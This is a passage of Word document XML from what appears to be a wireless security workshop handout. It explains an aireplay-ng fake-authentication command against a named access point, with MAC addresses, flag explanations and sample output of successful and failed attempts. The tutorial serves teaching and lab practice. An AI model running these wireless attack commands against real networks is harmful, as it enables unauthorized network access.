          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77894CB7" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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00:09:5B:EC:EE:F2 is our card MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6950FF9D" w14:textId="4FCDB811" w:rsidR="004652D1" w:rsidRDefault="00277615" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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sidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0463FFC6" w14:textId="77777777" w:rsidR="00F80E8E" w:rsidRDefault="00F80E8E" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="636B230B"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Success looks like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202C4440" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00DC6CB9" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D430A43" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00DC6CB9" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FEDA353" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00DC6CB9" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A9F9214" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00DC6CB9" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Association</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful :-)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B57F18D" w14:textId="77777777" w:rsidR="00F80E8E" w:rsidRDefault="00F80E8E" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26B3C489"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Or another variation for picky access points:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2203A294" w14:textId="77777777" w:rsidR="007E5CF0" w:rsidRDefault="007E5CF0" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5987893F" w14:textId="6725D97A" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -1 6000 -o 1 -q 10 -e </w:t>
      </w:r>
      <w:r w:rsidR="007E5CF0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DA5E8D" w14:textId="77777777" w:rsidR="00F80E8E" w:rsidRPr="00F80E8E" w:rsidRDefault="00F80E8E" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FA908AF"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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52BEF066" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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 xml:space="preserve">6000 - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Reauthenticate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> very 6000 seconds. The long period also causes keep alive packets to be sent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02195632" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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o</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210C672D" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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q</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10 - Send keep alive packets every 10 seconds.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C8D395" w14:textId="77777777" w:rsidR="00F80E8E" w:rsidRDefault="00F80E8E" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73DEE6DD"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Success looks like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="494BA1FF" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:22:32  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75929B42" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:22:32  Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145B3B33" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:22:32  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFACFB3" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:22:32  Association</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful :-)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52FEB408" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:22:42  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> keep-alive packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104D84FB" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:22:52  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> keep-alive packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F33E25" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2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F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> so on.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A3C451" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Here is an example of what a failed authentication looks like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03AF3E15" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>8:28:02  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74ED5968" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:28:02  Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508BEA4F" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:28:02  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
